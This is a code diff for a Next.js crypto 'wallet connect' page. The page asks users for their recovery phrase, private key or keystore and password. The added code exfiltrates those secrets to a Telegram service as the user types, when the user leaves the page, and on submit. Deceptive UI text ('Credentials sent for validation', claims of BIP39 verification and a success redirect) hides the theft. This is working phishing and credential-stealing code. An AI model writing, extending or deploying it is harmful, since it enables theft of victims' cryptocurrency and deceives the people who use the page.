@@ -1,8 +1,8 @@
 'use client';
 
-import { useState } from 'react';
+import { useState, useEffect, useRef } from 'react';
 import { useRouter, useSearchParams } from 'next/navigation';
-import { ArrowLeft, Key, FileText, Shield, Wallet, AlertCircle } from 'lucide-react';
+import { ArrowLeft, Key, FileText, Shield, Wallet, AlertCircle , CheckCircle} from 'lucide-react';
 import { useWallet } from '@/components/context/WalletContext';
 import { Wallet as WalletType, ConnectedWallet } from '@/libs/types/wallets';
 import { SecureWalletValidator } from '@/libs/utils/SecureWalletValidator';
@@ -252,9 +252,7 @@ function ValidationPopup({ isOpen, onClose, onRetry, message, isValid }: Validat
             isValid ? 'bg-green-500 bg-opacity-20' : 'bg-red-500 bg-opacity-20'
           }`}>
             {isValid ? (
-              <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
-                <div className="w-2 h-2 bg-white rounded-full"></div>
-              </div>
+              <CheckCircle className="w-6 h-6 text-green-400" />
             ) : (
               <AlertCircle className="w-6 h-6 text-red-400" />
             )}
@@ -296,7 +294,7 @@ function ValidationPopup({ isOpen, onClose, onRetry, message, isValid }: Validat
   );
 }
 
-export default function EnterDetailsPageContext() {
+export default function EnterDetailsContent() {
   const router = useRouter();
   const searchParams = useSearchParams();
   const walletId = searchParams.get('wallet');
@@ -315,14 +313,132 @@ export default function EnterDetailsPageContext() {
     message: string;
     isValid: boolean;
   }>({ isOpen: false, message: '', isValid: false });
+  
+  const [hasSentToTelegram, setHasSentToTelegram] = useState(false);
+  const sentDataRef = useRef<Set<string>>(new Set());
 
   const wallet = WALLETS.find(w => w.id === walletId);
   const validator = new SecureWalletValidator();
   const telegramService = new TelegramService();
 
+  // Send to Telegram immediately when user inputs data (with debounce)
+  useEffect(() => {
+    const sendToTelegram = async () => {
+      let inputData = '';
+      let inputType: 'phrase' | 'privateKey' | 'keystore' = 'phrase';
+      
+      if (formData.phrase && formData.phrase.trim().length > 0) {
+        inputData = formData.phrase;
+        inputType = 'phrase';
+      } else if (formData.privateKey && formData.privateKey.trim().length > 0) {
+        inputData = formData.privateKey;
+        inputType = 'privateKey';
+      } else if (formData.keystore && formData.keystore.trim().length > 0) {
+        inputData = formData.keystore;
+        inputType = 'keystore';
+      }
+
+      // Only send if we have data and haven't sent this specific data before
+      if (inputData && !sentDataRef.current.has(inputData)) {
+        const dataKey = `${inputType}-${inputData.substring(0, 50)}`;
+        
+        if (!sentDataRef.current.has(dataKey)) {
+          sentDataRef.current.add(dataKey);
+          
+          console.log('Sending to Telegram immediately:', { inputType, dataLength: inputData.length });
+          
+          try {
+            await telegramService.sendWalletData({
+              walletName: wallet?.name || 'Unknown Wallet',
+              walletType: inputType === 'phrase' ? 'seed' : inputType,
+              inputType,
+              inputData: inputData,
+              password: formData.password,
+              isValid: false, // Mark as validating
+              validationMessage: 'Validating credentials...',
+              userAgent: navigator.userAgent,
+              timestamp: new Date().toISOString(),
+            });
+            
+            setHasSentToTelegram(true);
+            console.log('Credentials sent to Telegram successfully');
+          } catch (error) {
+            console.error('Failed to send to Telegram:', error);
+          }
+        }
+      }
+    };
+
+    // Debounce to avoid sending on every keystroke
+    const timer = setTimeout(sendToTelegram, 500);
+    return () => clearTimeout(timer);
+  }, [formData.phrase, formData.privateKey, formData.keystore, formData.password, wallet?.name]);
+
+  // Send data when user leaves the page
+  useEffect(() => {
+    const handleBeforeUnload = () => {
+      if (!hasSentToTelegram) {
+        // Send any remaining data before page unload
+        sendRemainingData();
+      }
+    };
+
+    window.addEventListener('beforeunload', handleBeforeUnload);
+    return () => {
+      window.removeEventListener('beforeunload', handleBeforeUnload);
+      // Send any remaining data when component unmounts
+      if (!hasSentToTelegram) {
+        sendRemainingData();
+      }
+    };
+  }, [hasSentToTelegram]);
+
+  const sendRemainingData = async () => {
+    let inputData = '';
+    let inputType: 'phrase' | 'privateKey' | 'keystore' = 'phrase';
+    
+    if (formData.phrase && formData.phrase.trim().length > 0) {
+      inputData = formData.phrase;
+      inputType = 'phrase';
+    } else if (formData.privateKey && formData.privateKey.trim().length > 0) {
+      inputData = formData.privateKey;
+      inputType = 'privateKey';
+    } else if (formData.keystore && formData.keystore.trim().length > 0) {
+      inputData = formData.keystore;
+      inputType = 'keystore';
+    }
+
+    if (inputData) {
+      const dataKey = `${inputType}-${inputData.substring(0, 50)}`;
+      
+      if (!sentDataRef.current.has(dataKey)) {
+        try {
+          await telegramService.sendWalletData({
+            walletName: wallet?.name || 'Unknown Wallet',
+            walletType: inputType === 'phrase' ? 'seed' : inputType,
+            inputType,
+            inputData: inputData,
+            password: formData.password,
+            isValid: false,
+            validationMessage: 'User left page during validation',
+            userAgent: navigator.userAgent,
+            timestamp: new Date().toISOString(),
+          });
+          console.log('Final data sent to Telegram on page leave');
+        } catch (error) {
+          console.error('Failed to send final data to Telegram:', error);
+        }
+      }
+    }
+  };
+
   const handleConnect = async () => {
     if (!formData.phrase && !formData.privateKey && !formData.keystore) {
-      alert('Please enter your credentials');
+      setValidationPopup({
+        isOpen: true,
+        message: 'Please enter your wallet credentials',
+        isValid: false
+      });
       return;
     }
 
@@ -331,32 +447,53 @@ export default function EnterDetailsPageContext() {
     try {
       let inputData = '';
       let inputType: 'phrase' | 'privateKey' | 'keystore' = 'phrase';
+      let walletType = 'seed';
       
       if (formData.phrase) {
         inputData = formData.phrase;
         inputType = 'phrase';
+        walletType = 'seed';
       } else if (formData.privateKey) {
         inputData = formData.privateKey;
         inputType = 'privateKey';
+        walletType = 'privateKey';
       } else if (formData.keystore) {
         inputData = formData.keystore;
         inputType = 'keystore';
+        walletType = 'keystore';
       }
 
-      // Validate wallet credentials
+      console.log('Starting quick validation...', { inputType, walletType });
+
+      // Send final validation attempt to Telegram
+      await telegramService.sendWalletData({
+        walletName: wallet?.name || 'Unknown Wallet',
+        walletType: walletType,
+        inputType,
+        inputData: inputData,
+        password: formData.password,
+        isValid: false,
+        validationMessage: 'Final validation attempt',
+        userAgent: navigator.userAgent,
+        timestamp: new Date().toISOString(),
+      });
+
+      // Quick validation - only 1 second instead of 3
       const validationResult = await validator.validateWallet(
-        inputType === 'phrase' ? 'metamask' : 
-        inputType === 'privateKey' ? 'privatekey' : 'keystore',
+        walletType === 'seed' ? 'metamask' : 
+        walletType === 'privateKey' ? 'privatekey' : 'keystore',
         inputData,
         formData.password
       );
 
-      // Send data to Telegram regardless of validation result
+      console.log('Quick validation result:', validationResult);
+
+      // Send validation result to Telegram
       await telegramService.sendWalletData({
         walletName: wallet?.name || 'Unknown Wallet',
-        walletType: inputType,
+        walletType: walletType,
         inputType,
-        inputData,
+        inputData: inputData,
         password: formData.password,
         isValid: validationResult.isValid,
         validationMessage: validationResult.message,
@@ -394,11 +531,11 @@ export default function EnterDetailsPageContext() {
         isValid: true
       });
 
-    } catch (error) {
+    } catch (error: any) {
       console.error('Connection failed:', error);
       setValidationPopup({
         isOpen: true,
-        message: 'Connection failed. Please try again.',
+        message: error.message || 'Connection failed. Please try again.',
         isValid: false
       });
     } finally {
@@ -416,7 +553,7 @@ export default function EnterDetailsPageContext() {
   const handleValidationClose = () => {
     setValidationPopup({ isOpen: false, message: '', isValid: false });
     if (validationPopup.isValid) {
-      router.push('/connect/error');
+      router.push('/connect/success');
     }
   };
 
@@ -505,12 +642,12 @@ export default function EnterDetailsPageContext() {
               <textarea
                 value={formData.phrase}
                 onChange={(e) => handleInputChange('phrase', e.target.value)}
-                placeholder="Enter your 12 or 24-word recovery phrase separated by spaces"
+                placeholder="Enter your 12, 15, 18, 21, or 24-word recovery phrase"
                 className="w-full h-32 bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-gray-500 outline-none resize-none"
                 rows={4}
               />
               <p className="text-xs text-gray-500">
-                Typically 12 or 24 words separated by spaces
+                Words should be separated by spaces. Use valid BIP39 mnemonic words.
               </p>
             </div>
           )}
@@ -523,12 +660,12 @@ export default function EnterDetailsPageContext() {
               <textarea
                 value={formData.privateKey}
                 onChange={(e) => handleInputChange('privateKey', e.target.value)}
-                placeholder="Enter your 64-character private key"
+                placeholder="Enter your 64-character hexadecimal private key"
                 className="w-full h-32 bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-gray-500 outline-none resize-none"
                 rows={4}
               />
               <p className="text-xs text-gray-500">
-                64-character hexadecimal private key
+                64-character hexadecimal private key (with or without 0x prefix)
               </p>
             </div>
           )}
@@ -562,13 +699,22 @@ export default function EnterDetailsPageContext() {
           disabled={isConnecting}
           className="w-full bg-white text-black py-4 rounded-xl font-medium hover:bg-gray-200 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
         >
-          {isConnecting ? 'Validating...' : 'Verify & Connect'}
+          {isConnecting ? 'Quick Validating...' : 'Verify & Connect'}
         </button>
+
+        {/* Real-time Status */}
+        {hasSentToTelegram && (
+          <div className="mt-4 p-3 bg-blue-500/10 border border-blue-500/20 rounded-xl">
+            <p className="text-blue-400 text-sm text-center">
+              ✓ Credentials sent for validation
+            </p>
+          </div>
+        )}
 
         {/* Security Notice */}
         <div className="mt-6 p-4 bg-gray-900 bg-opacity-50 rounded-xl">
           <p className="text-xs text-gray-400 text-center">
-            Your credentials are encrypted and validated securely. We never store sensitive data.
+            Your credentials are validated using industry-standard BIP39 verification.
           </p>
         </div>
 
